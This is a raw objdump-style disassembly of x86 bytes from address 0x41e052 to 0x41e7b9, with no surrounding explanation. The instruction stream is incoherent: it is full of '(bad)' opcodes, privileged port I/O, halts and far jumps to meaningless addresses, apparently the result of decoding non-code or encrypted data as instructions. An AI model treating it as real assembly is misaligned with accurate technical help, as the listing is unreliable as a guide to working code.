  41e052:	jmp    0x2d2fe99d
  41e057:	call   0x2124066c
  41e05c:	imul   edi,DWORD PTR [ebp+0x46]
  41e060:	dec    ecx
  41e061:	xchg   edx,eax
  41e062:	xor    eax,DWORD PTR [ebx+0x72]
  41e065:	push   cs
  41e066:	aam    0xdd
  41e068:	mov    edx,0xe85c3481
  41e06d:	sbb    bh,dh
  41e06f:	shl    BYTE PTR [ebx],0xb9
  41e072:	fiadd  DWORD PTR [edx+0x74185a9c]
  41e078:	pop    es
  41e079:	sub    bh,BYTE PTR [edx+ebx*2]
  41e07c:	push   eax
  41e07d:	xchg   esi,eax
  41e07e:	mov    bh,0x66
  41e080:	xchg   edi,eax
  41e081:	mov    ebp,0xa7a7dbe8
  41e086:	dec    BYTE PTR [edi-0x2deb2573]
  41e08c:	pop    ss
  41e08d:	sub    esi,DWORD PTR [eax-0x75]
  41e090:	or     eax,0x8a6ba683
  41e095:	jmp    0x41e0c6
  41e097:	arpl   WORD PTR [edi-0x47],cx
  41e09a:	fist   WORD PTR [ebx+0x74ef07e4]
  41e0a0:	sub    ebp,0xa7463527
  41e0a6:	and    eax,0xc5038057
  41e0ab:	jo     0x41e0c2
  41e0ad:	inc    esi
  41e0ae:	cmp    DWORD PTR [ecx+0x77],eax
  41e0b1:	loop   0x41e069
  41e0b3:	sbb    eax,0x4738a568
  41e0b8:	fcom   QWORD PTR [ebp-0x6c]
  41e0bb:	out    0xf6,eax
  41e0bd:	inc    edi
  41e0be:	call   0xc962:0x93ed7474
  41e0c5:	cmp    dh,BYTE PTR [ebx+0x5934fc64]
  41e0cb:	mov    al,ds:0x821e6eb
  41e0d0:	jmp    0x41e078
  41e0d2:	jl     0x41e0b9
  41e0d4:	call   0x57c028d0
  41e0d9:	add    al,cl
  41e0db:	pop    ds
  41e0dc:	shr    DWORD PTR [ecx+0x3d],cl
  41e0df:	fcom   DWORD PTR [eax]
  41e0e1:	cmovo  edi,DWORD PTR [edx+0x2]
  41e0e5:	cmp    BYTE PTR ds:0x7159c57e,al
  41e0eb:	dec    ecx
  41e0ec:	cmp    edi,DWORD PTR [esi-0x62]
  41e0ef:	hlt    
  41e0f0:	cmc    
  41e0f1:	faddp  st(2),st
  41e0f3:	mov    esp,0xa8c384ab
  41e0f8:	in     eax,dx
  41e0f9:	mov    ss,WORD PTR [ebp-0x50]
  41e0fc:	jg     0x41e0e4
  41e0fe:	fwait
  41e0ff:	sbb    eax,0x1acbe77e
  41e104:	arpl   cx,cx
  41e106:	mov    ebp,0x9642c0e3
  41e10b:	into   
  41e10c:	inc    ecx
  41e10d:	clc    
  41e10e:	jbe    0x41e150
  41e110:	out    dx,eax
  41e111:	mov    dl,0x14
  41e113:	sub    DWORD PTR [ebx-0x4052778e],edi
  41e119:	aaa    
  41e11a:	out    0x96,al
  41e11c:	addr16 pop ecx
  41e11e:	daa    
  41e11f:	and    eax,0x166ae35c
  41e124:	push   ecx
  41e125:	test   eax,0xdcccf6ba
  41e12a:	lods   al,BYTE PTR ds:[esi]
  41e12b:	loop   0x41e0e5
  41e12d:	lea    edx,[ecx+edx*1]
  41e130:	js     0x41e12c
  41e132:	out    dx,al
  41e133:	or     BYTE PTR [ebp+edi*4-0x27c10457],dl
  41e13a:	je     0x41e0fb
  41e13c:	fdivr  st,st(2)
  41e13e:	cmp    BYTE PTR [edi],ch
  41e140:	adc    ebp,DWORD PTR [ecx]
  41e142:	add    dl,BYTE PTR [esi-0x4b]
  41e145:	inc    eax
  41e146:	sbb    eax,0x8e1f4d22
  41e14b:	ficomp DWORD PTR [esi+ebx*4]
  41e14e:	stos   BYTE PTR es:[edi],al
  41e14f:	mov    BYTE PTR [ecx+0x23],ch
  41e152:	(bad)  
  41e153:	cdq    
  41e154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e155:	repz mov esp,ds
  41e158:	dec    edx
  41e159:	or     al,0x6f
  41e15b:	xor    eax,ebx
  41e15d:	push   eax
  41e15e:	fcom   st(7)
  41e160:	mov    ds:0x694dee51,al
  41e165:	jle    0x41e139
  41e167:	jo     0x41e1cd
  41e169:	dec    ebx
  41e16a:	pop    ss
  41e16b:	les    edx,FWORD PTR [esi-0x66]
  41e16e:	(bad)  
  41e16f:	jb     0x41e1e8
  41e171:	push   ebp
  41e172:	push   esi
  41e173:	adc    ebx,DWORD PTR [eax]
  41e175:	adc    eax,0x5dc097ca
  41e17a:	xchg   esi,eax
  41e17b:	fldcw  WORD PTR [ecx]
  41e17d:	aas    
  41e17e:	in     al,dx
  41e17f:	repnz adc dh,ch
  41e182:	(bad)  
  41e183:	ss out 0x2b,al
  41e186:	addr16 ja 0x41e194
  41e189:	into   
  41e18a:	lods   eax,DWORD PTR ds:[esi]
  41e18b:	mov    bl,0x8c
  41e18d:	jle    0x41e1a4
  41e18f:	das    
  41e190:	lahf   
  41e191:	push   ecx
  41e192:	shr    ebp,cl
  41e194:	and    cl,0xc5
  41e197:	enter  0x5374,0x28
  41e19b:	jns    0x41e196
  41e19d:	stc    
  41e19e:	inc    eax
  41e19f:	adc    al,0x55
  41e1a1:	push   ecx
  41e1a2:	inc    edi
  41e1a3:	mov    ds:0xd2a62e5f,al
  41e1a8:	mov    ebx,0xbfbea035
  41e1ad:	call   DWORD PTR [eax+0x58]
  41e1b0:	sahf   
  41e1b1:	jns    0x41e21d
  41e1b3:	js     0x41e1e8
  41e1b5:	loopne 0x41e17b
  41e1b7:	push   ebp
  41e1b8:	mov    BYTE PTR [ebp+esi*8+0x76],dh
  41e1bc:	jp     0x41e143
  41e1be:	arpl   WORD PTR [edi-0x4b36eedc],dx
  41e1c4:	push   DWORD PTR [ebp-0x56]
  41e1c7:	jno    0x41e236
  41e1c9:	xor    al,dl
  41e1cb:	jmp    0x41e1df
  41e1cd:	xlat   BYTE PTR ds:[ebx]
  41e1ce:	xor    BYTE PTR [edi-0xe],al
  41e1d1:	shl    BYTE PTR [ecx+ebp*2-0x17],0x7d
  41e1d6:	inc    eax
  41e1d7:	add    DWORD PTR [eax-0x52],ebp
  41e1da:	mov    esi,DWORD PTR [esi]
  41e1dc:	fldenv [esi]
  41e1de:	pop    esi
  41e1df:	xor    ebx,DWORD PTR [ecx+0x26f3686a]
  41e1e5:	ins    BYTE PTR es:[edi],dx
  41e1e6:	fcom   QWORD PTR [edi-0x2a7e71ba]
  41e1ec:	setns  ch
  41e1ef:	pop    ebx
  41e1f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1f1:	les    ebx,FWORD PTR [ebx-0x4f71915f]
  41e1f7:	in     eax,0x6f
  41e1f9:	inc    ebx
  41e1fa:	add    al,cl
  41e1fc:	push   ebp
  41e1fd:	push   ds
  41e1fe:	mov    cl,0x95
  41e200:	push   cs
  41e201:	and    ebx,DWORD PTR [eax]
  41e203:	(bad)  
  41e204:	push   cs
  41e205:	int3   
  41e206:	inc    esp
  41e207:	ins    DWORD PTR es:[edi],dx
  41e208:	add    esi,DWORD PTR [edi]
  41e20a:	cmp    BYTE PTR [edx],al
  41e20c:	and    BYTE PTR [edi+0x70],0x39
  41e210:	out    dx,al
  41e211:	cmc    
  41e212:	dec    esi
  41e213:	loopne 0x41e1a0
  41e215:	and    eax,0xba1dca9
  41e21a:	mov    esp,0x20bb7201
  41e21f:	xchg   ebp,edx
  41e221:	xor    ebx,edx
  41e223:	jmp    0x41e1e4
  41e225:	adc    esi,ebp
  41e227:	mov    ds:0x5b1bb1ac,eax
  41e22c:	cmp    ebp,DWORD PTR [eax]
  41e22e:	fcomip st,st(0)
  41e230:	sub    BYTE PTR [ebp-0x6b],0xce
  41e234:	and    edi,esp
  41e236:	sbb    al,0x99
  41e238:	fldenv [edx+0x2a369ff6]
  41e23e:	jmp    0x41e259
  41e240:	adc    dh,bl
  41e242:	xchg   esp,eax
  41e243:	inc    esp
  41e244:	inc    edx
  41e245:	xlat   BYTE PTR ds:[ebx]
  41e246:	div    BYTE PTR [ecx-0x70e1cc97]
  41e24c:	hlt    
  41e24d:	and    al,BYTE PTR [esi+ebp*4+0x3f]
  41e251:	add    BYTE PTR [ecx+ebx*1+0x1d],dl
  41e255:	pop    ebp
  41e256:	fldenv [esi-0x2adb3ceb]
  41e25c:	imul   edi,DWORD PTR [ebp+0x593606e0],0x3eff4c5
  41e266:	or     BYTE PTR [ebx+0x4d],bh
  41e269:	xchg   edx,eax
  41e26a:	in     al,dx
  41e26b:	pushf  
  41e26c:	add    BYTE PTR [esi+eax*1-0x4cc4f8fe],cl
  41e273:	push   ebx
  41e274:	ds push ds
  41e276:	fs inc esi
  41e278:	sbb    bh,ch
  41e27a:	add    bl,BYTE PTR [esp+ebx*1+0x77]
  41e27e:	sbb    BYTE PTR [esi],0xcb
  41e281:	and    eax,0x192ca0bb
  41e286:	xchg   esi,eax
  41e287:	popf   
  41e288:	cmp    eax,0x97269050
  41e28d:	xchg   ebx,eax
  41e28e:	xchg   esi,eax
  41e28f:	rcr    BYTE PTR [ecx-0x594921a5],0xc0
  41e296:	jmp    0xf6fc:0xaaec87ce
  41e29d:	inc    ecx
  41e29e:	fcom   DWORD PTR [edx-0x400851e1]
  41e2a4:	pop    ss
  41e2a5:	call   0xe505:0x25411b00
  41e2ac:	cmp    edx,DWORD PTR [ebx+0x69aa99fd]
  41e2b2:	push   ss
  41e2b3:	dec    ebp
  41e2b4:	out    dx,al
  41e2b5:	sbb    BYTE PTR [ecx-0x68],ch
  41e2b8:	pop    eax
  41e2b9:	add    al,0x99
  41e2bb:	jge    0x41e2c4
  41e2bd:	push   ss
  41e2be:	(bad)  
  41e2bf:	enter  0x90da,0xa7
  41e2c3:	(bad)  
  41e2c4:	stos   DWORD PTR es:[edi],eax
  41e2c5:	push   esp
  41e2c6:	clc    
  41e2c7:	xchg   ebp,eax
  41e2c8:	mov    al,0x43
  41e2ca:	in     al,dx
  41e2cb:	shr    BYTE PTR [edx],cl
  41e2cd:	lods   eax,DWORD PTR ds:[esi]
  41e2ce:	sti    
  41e2cf:	jno    0x41e260
  41e2d1:	pop    ebp
  41e2d2:	inc    ebx
  41e2d3:	cld    
  41e2d4:	xchg   ebp,eax
  41e2d5:	sbb    eax,0x79dd0c9
  41e2da:	jbe    0x41e320
  41e2dc:	dec    edx
  41e2dd:	or     DWORD PTR [eax+0x76cb85bf],ebp
  41e2e3:	sub    esp,DWORD PTR [eax+0x51]
  41e2e6:	mov    eax,ds:0x4c5ab611
  41e2eb:	loop   0x41e2f4
  41e2ed:	push   edx
  41e2ee:	fisubr WORD PTR [edx+0x65767649]
  41e2f4:	xor    al,0x30
  41e2f6:	and    ebx,ebp
  41e2f8:	add    edi,DWORD PTR [esi+ebp*4+0x1f0a8c10]
  41e2ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e300:	sub    dh,BYTE PTR [edi]
  41e302:	retf   
  41e303:	mov    ch,0x13
  41e305:	fstp   QWORD PTR [esi]
  41e307:	sub    eax,0xe5833761
  41e30c:	and    eax,0x94709c6e
  41e311:	cmp    DWORD PTR [edi-0x18],ecx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	sub    DWORD PTR [eax],0xc6da5d87
  41e31b:	sub    esi,esp
  41e31d:	xor    DWORD PTR [edi],ecx
  41e31f:	cmp    ecx,esi
  41e321:	jge    0x41e35b
  41e323:	fisttp WORD PTR [eax]
  41e325:	out    dx,eax
  41e326:	test   BYTE PTR [esi+0x41dedc38],bh
  41e32c:	push   ds
  41e32d:	rcl    dl,cl
  41e32f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41e331:	dec    DWORD PTR ds:0xd902e16d
  41e337:	loopne 0x41e2f3
  41e339:	mov    cl,0x3
  41e33b:	push   ss
  41e33c:	jmp    0x41e36e
  41e33e:	(bad)  
  41e33f:	fnsave [esi-0x78005196]
  41e345:	cmp    BYTE PTR [ebp+0x3c43954c],dh
  41e34b:	inc    esp
  41e34c:	(bad)  
  41e34e:	add    BYTE PTR [ebx],dl
  41e350:	jmp    0x78914806
  41e355:	xor    eax,0xfbad3c60
  41e35a:	push   edi
  41e35b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e35c:	mov    edi,0x3f84dfa6
  41e361:	jae    0x41e3c7
  41e363:	mov    eax,ds:0x2dbe3764
  41e368:	dec    eax
  41e369:	popa   
  41e36a:	push   es
  41e36b:	or     al,0x8a
  41e36d:	fnsave [esi-0x2acc9567]
  41e373:	sub    BYTE PTR [edx+0x1f],ah
  41e376:	into   
  41e377:	and    DWORD PTR [edi],eax
  41e379:	cmp    BYTE PTR [edi-0x61],ah
  41e37c:	and    ah,BYTE PTR [edx+esi*4]
  41e37f:	data16 aas 
  41e381:	xor    ebp,DWORD PTR [edx+esi*2+0x7e]
  41e385:	ss (bad) 
  41e387:	jg     0x41e395
  41e389:	aaa    
  41e38a:	in     al,0xb6
  41e38c:	and    BYTE PTR [ecx+0x5896548],ch
  41e392:	sahf   
  41e393:	mov    ds:0xf840836e,al
  41e398:	push   esi
  41e399:	dec    edx
  41e39a:	es push eax
  41e39c:	das    
  41e39d:	push   esp
  41e39e:	stos   DWORD PTR es:[edi],eax
  41e39f:	or     al,0xe
  41e3a1:	sub    ah,bl
  41e3a3:	xchg   esp,eax
  41e3a4:	cmc    
  41e3a5:	aaa    
  41e3a6:	dec    BYTE PTR ds:0x8c97ff7e
  41e3ac:	data16 shl BYTE PTR [ebx+0x16afa8be],1
  41e3b3:	xchg   ax,ax
  41e3b5:	cs push ds
  41e3b7:	out    dx,al
  41e3b8:	pusha  
  41e3b9:	loop   0x41e428
  41e3bb:	jmp    DWORD PTR [ecx-0x333e459d]
  41e3c1:	xor    BYTE PTR [edx-0x7],dl
  41e3c4:	repnz pop ebx
  41e3c6:	dec    esp
  41e3c7:	cs cdq 
  41e3c9:	pop    edi
  41e3ca:	(bad)  
  41e3cb:	dec    ebx
  41e3cc:	xchg   edi,eax
  41e3cd:	scas   eax,DWORD PTR es:[edi]
  41e3ce:	mov    dl,0xc8
  41e3d0:	(bad)  
  41e3d1:	mov    al,0x79
  41e3d3:	jg     0x41e3db
  41e3d5:	cmp    ch,BYTE PTR [edx+0x407f5927]
  41e3db:	jmp    0x42b8f02d
  41e3e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3e1:	xchg   ebp,eax
  41e3e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3e3:	dec    ecx
  41e3e4:	stos   DWORD PTR es:[edi],eax
  41e3e5:	cmc    
  41e3e6:	test   DWORD PTR [ecx+0x7e],0x4ba027fa
  41e3ed:	push   ebx
  41e3ee:	int3   
  41e3ef:	mov    ds:0xa2a4030e,al
  41e3f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3f5:	mov    al,ds:0xcbc4d05f
  41e3fa:	fidivr DWORD PTR [edx-0x492f35f5]
  41e400:	push   ebx
  41e401:	test   eax,0xd2284dfd
  41e406:	dec    esi
  41e407:	mov    ebx,0x20ba4678
  41e40c:	cmp    ebx,DWORD PTR [edi+0x4c]
  41e40f:	jne    0x41e393
  41e411:	clc    
  41e412:	mov    al,ds:0x2989270a
  41e417:	repnz rcr BYTE PTR [eax],0x58
  41e41b:	xchg   esi,eax
  41e41c:	xchg   ebx,eax
  41e41d:	xchg   esp,eax
  41e41e:	out    0x53,al
  41e420:	call   0xce3fac88
  41e425:	stos   BYTE PTR es:[edi],al
  41e426:	fild   DWORD PTR [esi+0x696dee43]
  41e42c:	xor    edi,ebx
  41e42e:	ficom  DWORD PTR [edx-0x69]
  41e431:	mul    BYTE PTR [ebx]
  41e433:	and    BYTE PTR [eax-0x4d637a63],0x9a
  41e43a:	es adc ecx,edx
  41e43d:	mov    al,ds:0xb2fa0ae3
  41e442:	fcmovne st,st(7)
  41e444:	cwde   
  41e445:	jmp    0x46514e4c
  41e44a:	fisttp WORD PTR [esi-0x31]
  41e44d:	in     eax,0x7e
  41e44f:	xor    al,0xe3
  41e451:	div    BYTE PTR [ebx]
  41e453:	std    
  41e454:	loop   0x41e4a0
  41e456:	aaa    
  41e457:	xchg   edx,eax
  41e458:	mov    edx,esp
  41e45a:	js     0x41e435
  41e45c:	pop    es
  41e45d:	xor    DWORD PTR [edx+ebp*4+0x63],0xccd4a8e
  41e465:	fst    QWORD PTR ds:[edx+ebp*8]
  41e469:	leave  
  41e46a:	int    0x2d
  41e46c:	adc    ch,cl
  41e46e:	in     eax,0xd9
  41e470:	sub    al,0xd1
  41e472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e473:	test   BYTE PTR [esi+0x4453f651],ch
  41e479:	mov    BYTE PTR [esi+0xede152d],al
  41e47f:	enter  0x9a85,0x77
  41e483:	dec    ecx
  41e484:	add    eax,0x528d3793
  41e489:	mov    eax,0x83fe99c5
  41e48e:	add    al,0x44
  41e490:	fsubr  QWORD PTR [ebx-0x49]
  41e493:	and    eax,0x76ed1d2a
  41e498:	jno    0x41e4bf
  41e49a:	xchg   ecx,eax
  41e49b:	int    0xe8
  41e49d:	out    dx,al
  41e49e:	and    esi,ecx
  41e4a0:	cmp    eax,0xd824a072
  41e4a5:	mov    ebp,0xebeddab
  41e4aa:	dec    esi
  41e4ab:	aam    0x2f
  41e4ad:	cmp    bh,0xe
  41e4b0:	add    BYTE PTR [esi+0x7f],ah
  41e4b3:	adc    bl,BYTE PTR [edi+0x55]
  41e4b6:	fnstenv [esi+0x2e294480]
  41e4bc:	push   es
  41e4bd:	or     DWORD PTR [edi],0xa546d480
  41e4c3:	and    ebp,DWORD PTR [ecx]
  41e4c5:	(bad)  
  41e4c6:	aad    0xb8
  41e4c8:	mov    ch,0xa2
  41e4ca:	add    eax,0x925af251
  41e4cf:	sbb    al,0x28
  41e4d1:	cmp    edi,DWORD PTR ds:0x2e25f767
  41e4d7:	ret    0xcd38
  41e4da:	jne    0x41e54f
  41e4dc:	out    0xf1,eax
  41e4de:	push   ds
  41e4df:	adc    dl,BYTE PTR [ecx+0x450ef7fe]
  41e4e5:	push   ebp
  41e4e6:	popa   
  41e4e7:	and    BYTE PTR [edi+ecx*2],ah
  41e4ea:	lahf   
  41e4eb:	sbb    DWORD PTR [esi+0x5e],ecx
  41e4ee:	nop
  41e4ef:	cwde   
  41e4f0:	push   cs
  41e4f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4f2:	shr    WORD PTR [edx+0xd],0x48
  41e4f7:	inc    esp
  41e4f8:	loopne 0x41e4d6
  41e4fa:	(bad)  
  41e4fb:	adc    dh,BYTE PTR [ebx]
  41e4fd:	hlt    
  41e4fe:	(bad)  
  41e4ff:	sbb    DWORD PTR [eax-0x9],ebp
  41e502:	mov    DWORD PTR [eax-0x1],0xac74ce8f
  41e509:	inc    eax
  41e50a:	test   BYTE PTR [edx-0x63],al
  41e50d:	(bad)  
  41e50f:	mov    dh,0x46
  41e511:	mov    esp,0xc2f86483
  41e516:	fmul   DWORD PTR [edi]
  41e518:	adc    al,0xf1
  41e51a:	cvtps2pi mm4,QWORD PTR ds:0xd51c16c4
  41e521:	xchg   ebx,eax
  41e522:	jae    0x41e524
  41e524:	dec    esi
  41e525:	adc    al,0x43
  41e527:	les    ebp,FWORD PTR [esi+0x35]
  41e52a:	ret    0x52b3
  41e52d:	popf   
  41e52e:	mov    esp,0xb3d5b1ab
  41e533:	inc    esp
  41e534:	or     eax,0x374d5c96
  41e539:	add    DWORD PTR [edi+0x13],edx
  41e53c:	sbb    DWORD PTR [ebx-0x2c],esp
  41e53f:	repnz mov eax,ds:0x158d1632
  41e545:	sub    eax,0x5093360a
  41e54a:	leave  
  41e54b:	lock push edx
  41e54d:	mov    ebp,DWORD PTR [edi]
  41e54f:	les    edx,FWORD PTR [edi]
  41e551:	or     al,0xe1
  41e553:	dec    esp
  41e554:	adc    dl,cl
  41e556:	add    eax,0xfc2f8494
  41e55b:	pushf  
  41e55c:	xor    ah,BYTE PTR [esi-0x421e9b4]
  41e562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e563:	cmp    eax,0xc89d9273
  41e568:	mov    ecx,0x92d1384e
  41e56d:	outs   dx,DWORD PTR ds:[esi]
  41e56e:	xchg   edx,eax
  41e56f:	add    eax,DWORD PTR [ebp-0x35]
  41e572:	adc    eax,0x120d2157
  41e577:	and    ch,al
  41e579:	jns    0x41e543
  41e57b:	aaa    
  41e57c:	mov    edi,0xbe7b54b1
  41e581:	hlt    
  41e582:	mov    dh,0xb3
  41e584:	out    dx,eax
  41e585:	clc    
  41e586:	test   al,0x76
  41e588:	mov    ebx,ebp
  41e58a:	jmp    0x41e5a4
  41e58c:	arpl   WORD PTR [eax],ax
  41e58e:	ds sahf 
  41e590:	outs   dx,DWORD PTR ds:[esi]
  41e591:	push   ecx
  41e592:	mov    eax,ds:0xa93ddb41
  41e597:	mov    bh,0x78
  41e59a:	fwait
  41e59b:	call   0xa102:0x547be3f1
  41e5a2:	xor    DWORD PTR [si-0x4d32],esp
  41e5a7:	mov    ?,WORD PTR [edx]
  41e5a9:	mov    cl,0x8e
  41e5ab:	adc    al,0x4d
  41e5ad:	and    dh,BYTE PTR [esi]
  41e5af:	cmp    al,0x37
  41e5b1:	jb     0x41e5b7
  41e5b3:	sahf   
  41e5b4:	or     eax,0x5cb60c6
  41e5b9:	inc    edx
  41e5ba:	push   cs
  41e5bb:	fmul   st,st(6)
  41e5bd:	xchg   ecx,eax
  41e5be:	xchg   esp,eax
  41e5bf:	push   eax
  41e5c0:	into   
  41e5c1:	jmp    0x26280a7a
  41e5c6:	retf   0xf4d9
  41e5c9:	and    ecx,esp
  41e5cb:	or     al,0xd1
  41e5cd:	js     0x41e5ba
  41e5cf:	jecxz  0x41e5e7
  41e5d1:	out    dx,eax
  41e5d2:	xchg   edx,eax
  41e5d3:	fisttp QWORD PTR [edi]
  41e5d5:	in     al,dx
  41e5d6:	pop    ebx
  41e5d7:	ret    
  41e5d8:	adc    DWORD PTR [edx],esi
  41e5da:	cwde   
  41e5db:	jl     0x41e5c0
  41e5dd:	inc    edx
  41e5de:	sub    BYTE PTR ds:0xff50a7f4,dl
  41e5e4:	jmp    0x41e58d
  41e5e6:	push   ecx
  41e5e7:	add    dh,BYTE PTR [ebx+0x380ce0d7]
  41e5ed:	xchg   esp,eax
  41e5ee:	fld    TBYTE PTR fs:[eax]
  41e5f1:	iret   
  41e5f2:	and    cl,BYTE PTR ds:0x1da6f450
  41e5f8:	xor    al,0x8d
  41e5fa:	xchg   esp,eax
  41e5fb:	xor    DWORD PTR [esi+eiz*1+0x6e734de1],edi
  41e602:	xchg   ebp,eax
  41e603:	iret   
  41e604:	loopne 0x41e624
  41e606:	outs   dx,BYTE PTR ds:[esi]
  41e607:	in     eax,dx
  41e608:	jmp    0xb3f:0xe98e020
  41e60f:	sub    BYTE PTR [ebp-0x71],ah
  41e612:	push   ecx
  41e613:	or     esi,eax
  41e615:	push   esp
  41e616:	(bad)  
  41e617:	call   0xcfd:0x8d5e3375
  41e61e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e61f:	mov    WORD PTR [eax],?
  41e621:	push   esi
  41e622:	jo     0x41e5f7
  41e624:	adc    ah,al
  41e626:	or     ecx,DWORD PTR [eax]
  41e628:	lahf   
  41e629:	ins    DWORD PTR es:[edi],dx
  41e62a:	push   ss
  41e62b:	push   0x12
  41e62d:	in     al,dx
  41e62e:	push   ss
  41e62f:	(bad)  
  41e630:	and    eax,0xf872c392
  41e635:	mov    edx,0x7c10e4c9
  41e63a:	or     DWORD PTR [ebx+0x5a],edx
  41e63d:	call   0x8d74:0x1bf027b4
  41e644:	and    al,0x9e
  41e646:	imul   ebp,DWORD PTR [ecx+eiz*2-0x7109366c],0x2d
  41e64e:	test   BYTE PTR [ebp-0x7d],0x17
  41e652:	in     al,0x25
  41e654:	and    edi,edx
  41e656:	mov    eax,0xa3dd15fa
  41e65b:	dec    ebp
  41e65c:	rcl    BYTE PTR [edi],cl
  41e65e:	cs xchg edx,eax
  41e660:	(bad)  
  41e661:	imul   ebx,DWORD PTR [esp+edi*2+0x5ab67540],0xba63df48
  41e66c:	xchg   edi,eax
  41e66d:	jb     0x41e66d
  41e66f:	shr    BYTE PTR [esi+0x41],cl
  41e672:	add    edx,DWORD PTR [ebp-0x6e86edde]
  41e678:	sbb    ebx,DWORD PTR [ebp-0x6e7d098c]
  41e67e:	push   edi
  41e680:	pop    ss
  41e681:	ret    0x1a5b
  41e684:	shr    DWORD PTR [esi+ebx*4+0x19b5aa3c],1
  41e68b:	inc    esp
  41e68c:	jg     0x41e6f1
  41e68e:	cmp    DWORD PTR [edi-0x3a],ebp
  41e691:	mov    eax,ds:0x5046aebe
  41e696:	and    ecx,0xffffff8b
  41e699:	dec    edx
  41e69a:	mov    ds:0x1f4e0c63,eax
  41e69f:	jg     0x78cacfaa
  41e6a5:	bound  ebp,QWORD PTR [ecx+edx*2]
  41e6a8:	pop    eax
  41e6a9:	fwait
  41e6aa:	dec    ebx
  41e6ab:	test   DWORD PTR [ebx-0x1a9461e6],ebp
  41e6b1:	adc    ebx,ebx
  41e6b3:	adc    al,0xe2
  41e6b5:	loope  0x41e708
  41e6b7:	fmul   st,st(4)
  41e6b9:	aad    0xe
  41e6bb:	dec    ebp
  41e6bc:	cmp    BYTE PTR ds:0x7dd66fa0,cl
  41e6c2:	cmp    edx,DWORD PTR [ecx]
  41e6c4:	ja     0x41e713
  41e6c6:	aad    0x8f
  41e6c8:	inc    ebx
  41e6c9:	loop   0x41e6c2
  41e6cb:	addr16 xor eax,0x46c6bcda
  41e6d1:	(bad)  [ebp-0x3c]
  41e6d4:	dec    edx
  41e6d5:	or     esp,DWORD PTR [ebx+0x36ae1138]
  41e6db:	pop    esi
  41e6dc:	loope  0x41e720
  41e6de:	add    DWORD PTR [ebp-0x47],eax
  41e6e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6e2:	fcmovnb st,st(3)
  41e6e4:	pop    ss
  41e6e5:	shl    BYTE PTR [eax+0x4cd7c30e],0x93
  41e6ec:	mov    ecx,0x25278107
  41e6f1:	xlat   BYTE PTR ds:[ebx]
  41e6f2:	cmp    DWORD PTR [esi],ebx
  41e6f4:	and    DWORD PTR [esi+ebx*8],0x4a
  41e6f8:	ins    BYTE PTR es:[edi],dx
  41e6f9:	mov    dl,0xbb
  41e6fb:	bswap  edx
  41e6fd:	test   al,0x93
  41e6ff:	enter  0xc6d7,0x83
  41e703:	mov    al,0xd8
  41e705:	ins    DWORD PTR es:[edi],dx
  41e706:	xlat   BYTE PTR ds:[ebx]
  41e707:	aaa    
  41e708:	or     al,0xc9
  41e70a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e70b:	cs mov eax,0x46db6952
  41e711:	push   es
  41e712:	and    edx,DWORD PTR [ebp+edi*4+0x29af8eee]
  41e719:	out    0xb6,al
  41e71b:	clc    
  41e71c:	out    dx,al
  41e71d:	mov    ds,WORD PTR [edx-0x2e59f444]
  41e723:	jecxz  0x41e6c1
  41e725:	sub    dh,BYTE PTR [ebp+0x575a3863]
  41e72b:	sbb    DWORD PTR [ecx-0x5455172],eax
  41e731:	inc    edi
  41e732:	dec    ebp
  41e733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e735:	(bad)  
  41e736:	jmp    0xf9410ebd
  41e73b:	sti    
  41e73c:	add    BYTE PTR [eax],ch
  41e73e:	pop    eax
  41e73f:	icebp  
  41e740:	addr16 (bad) 
  41e742:	mov    dh,0x4
  41e744:	mov    DWORD PTR [esi],ecx
  41e746:	xchg   BYTE PTR [edx],ah
  41e748:	pop    eax
  41e749:	push   ebx
  41e74a:	push   edi
  41e74b:	ja     0x41e6f3
  41e74d:	sub    ebx,DWORD PTR [ebp-0x35000b62]
  41e753:	jns    0x41e6f2
  41e755:	jnp    0x41e6f3
  41e757:	or     eax,0x54f1000d
  41e75c:	jl     0x41e74b
  41e75e:	jno    0x41e74d
  41e760:	add    bl,cl
  41e762:	xchg   esi,eax
  41e763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e764:	nop
  41e765:	popf   
  41e766:	adc    al,0xd9
  41e768:	push   esi
  41e769:	adc    eax,0xee2b6c1b
  41e76e:	inc    edx
  41e76f:	out    0x74,eax
  41e771:	adc    al,0xfd
  41e773:	in     al,dx
  41e774:	adc    BYTE PTR [edi-0x65],bh
  41e777:	cmp    bl,BYTE PTR [ebx+0x47b5dca]
  41e77d:	add    edx,edx
  41e77f:	popf   
  41e780:	loopne 0x41e7a2
  41e782:	mov    DWORD PTR [edx+0x3d],esp
  41e785:	sbb    DWORD PTR [ebp+0x28],ebp
  41e788:	ror    ebx,cl
  41e78a:	or     BYTE PTR [esi],ch
  41e78c:	push   ds
  41e78d:	je     0x41e761
  41e78f:	jbe    0x41e749
  41e791:	repnz pop ss
  41e793:	in     al,0x93
  41e795:	icebp  
  41e796:	cmp    DWORD PTR [edx],edi
  41e798:	or     bl,BYTE PTR [esi]
  41e79a:	scas   al,BYTE PTR es:[edi]
  41e79b:	push   ss
  41e79c:	lahf   
  41e79d:	jnp    0x41e805
  41e79f:	xor    cl,BYTE PTR [edi-0x71]
  41e7a2:	jnp    0x41e796
  41e7a4:	push   edx
  41e7a5:	pushf  
  41e7a6:	mov    edi,0xd620e6a9
  41e7ab:	call   0x6894b76c
  41e7b0:	fisttp DWORD PTR [ebx+0x3d09997c]
  41e7b6:	lods   eax,DWORD PTR ds:[esi]
  41e7b7:	loope  0x41e739
  41e7b9:	jl     0x41e7cf
